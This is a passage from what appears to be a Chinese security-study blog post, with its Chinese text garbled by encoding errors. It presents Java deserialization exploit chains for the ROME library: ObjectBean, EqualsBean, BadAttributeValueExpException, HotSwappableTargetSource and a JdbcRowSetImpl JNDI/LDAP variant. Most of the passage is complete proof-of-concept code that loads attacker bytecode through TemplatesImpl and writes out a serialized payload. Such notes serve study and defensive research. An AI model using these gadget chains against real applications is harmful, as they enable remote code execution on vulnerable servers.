class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Serialize(hashtable);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HashTbale-EqualsBean"><a href="#HashTbale-EqualsBean" class="headerlink" title="HashTbale+EqualsBean"></a>HashTbale+EqualsBean</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remo_HashTable_EqualsBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(equalsBean,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Serialize(hashtable);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="BadAttributeValueExpExceptionåˆ©ç”¨é“¾"><a href="#BadAttributeValueExpExceptionåˆ©ç”¨é“¾" class="headerlink" title="BadAttributeValueExpExceptionåˆ©ç”¨é“¾"></a>BadAttributeValueExpExceptionåˆ©ç”¨é“¾</h2><p>è¿™é‡Œå…¶å®åˆ©ç”¨çš„æ˜¯BadAttributeValueExpExceptionå¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„toStringæ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨cc5é“¾ã€fastjsonçš„æ—¶å€™éƒ½åˆ†æè¿‡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735227205386-b0c16d7c-699e-4fa6-ac11-abec86236342.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735227291022-30a771ff-dd42-4106-8d56-82fba20ed789.png"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯å¯ä»¥è°ƒç”¨toStringæ–¹æ³•çš„ä½†ç”±äºåœ¨å…¶æ„é€ å‡½æ•°ä¸­ä¹Ÿè°ƒç”¨äº†<code>toString()</code>ï¼Œä¸ºäº†é¿å…æå‰è§¦å‘æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå°„ä¿®æ”¹<code>val</code>çš„å€¼ä¸ºéœ€è¦è°ƒç”¨<code>toString()</code>æ–¹æ³•çš„ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remo_BadAttributeValueExpException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">111</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Serialize(badAttributeValueExpException);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="HotSwappableTargetSourceåˆ©ç”¨é“¾"><a href="#HotSwappableTargetSourceåˆ©ç”¨é“¾" class="headerlink" title="HotSwappableTargetSourceåˆ©ç”¨é“¾"></a>HotSwappableTargetSourceåˆ©ç”¨é“¾</h2><p>è¿™é‡Œå…¶å®åœ¨Fastjsonä¸­æœ‰æåˆ°è¿‡åˆ©ç”¨ä»–çš„Xstringèƒ½å¤Ÿè§¦å‘toStringæ–¹æ³•å…·ä½“æ‰§è¡Œæµç¨‹å¯ä»¥å‚è€ƒå†™çš„ç¬”è®°</p><p><a href="https://www.yuque.com/zqiangweihuakai/ybltae/kgggvgva58tf3sny">Fasjson å®Œæ•´ç‰ˆ</a>è¿™é‡Œæœ‰è®°å½•HotSwappableTargetSourceæ‰§è¡Œæµç¨‹ã€‚äº†è§£å®Œæ‰§è¡Œæµç¨‹å°±å¯ä»¥å¾ˆå¿«æ˜ç™½ä»¥ä¸‹poc</p><p>ç¯å¢ƒä¾èµ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">5.3</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remo_HotSwappableTargetSource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        hashMap.put(h2,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Serialize(hashMap);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="JdbcRowSetImplåˆ©ç”¨é“¾"><a href="#JdbcRowSetImplåˆ©ç”¨é“¾" class="headerlink" title="JdbcRowSetImplåˆ©ç”¨é“¾"></a>JdbcRowSetImplåˆ©ç”¨é“¾</h2><p>è¿™é‡Œè¿™æ¡é“¾è·Ÿå‰é¢çš„æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œä»–æ˜¯å»æ›¿æ¢templatesImplçš„æ˜¯æ›¿æ¢çš„ååŠæ®µï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸ºä»€ä¹ˆï¼Œå‰é¢è¯´åˆ°è¿‡rmoeå¯ä»¥è§¦å‘ä»»æ„ç±»çš„getteræ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œè‚¯å®šæ˜¯å»æ‰¾JdbcRowSetImplè¿™æ¡é“¾çš„getæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735229299376-5beac801-7708-49cc-8510-8d7c6f0d871e.png"></p><p>è¿™é‡Œèƒ½å¤Ÿæ‰¾åˆ°å­˜åœ¨ä¸€ä¸ªgetDatabaseMetaDataæ–¹æ³•å®ƒé‡Œé¢è°ƒç”¨äº†ä¸€ä¸ªconnectæ–¹æ³•æˆ‘ä»¬è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735229346935-b6020fff-7ef5-447f-b8e3-96981652baec.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¾ˆæ˜æ˜¾çš„jndiæ³¨å…¥ã€‚</p><p>lookUpé‡Œçš„å€¼æ˜¯å»è°ƒç”¨ä»–çˆ¶ç±»BaseRowSetçš„getDataSourceNameæ–¹æ³•è·å–çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735229417281-89625249-3d4c-442f-ad8b-872c496111de.png"></p><p>æ‰€ä»¥å¯ä»¥æ„é€ POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// ldap url</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/nils4f&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºJdbcRowSetImplå¯¹è±¡</span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dataSource</span> <span class="operator">=</span> BaseRowSet.class.getDeclaredField(<span class="string">&quot;dataSource&quot;</span>);</span><br><span class="line">        dataSource.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dataSource.set(jdbcRowSet, url);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºToStringBeanå¯¹è±¡</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);</span><br><span class="line">        <span class="comment">// åˆ›å»ºObjectBean</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºHashMap</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;bbbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;JdbcRowExp.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;JdbcRowExp.bin&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘åœ¨windowsç¯å¢ƒä¸‹å¤ç°æˆåŠŸäº†ä½†æ˜¯macä¸‹æ²¡æœ‰ä¸çŸ¥é“å•¥åŸå› å“ˆå“ˆå“ˆæœ‰æ‡‚å¾—å¸ˆå‚…æ•™æ•™</p><p><img 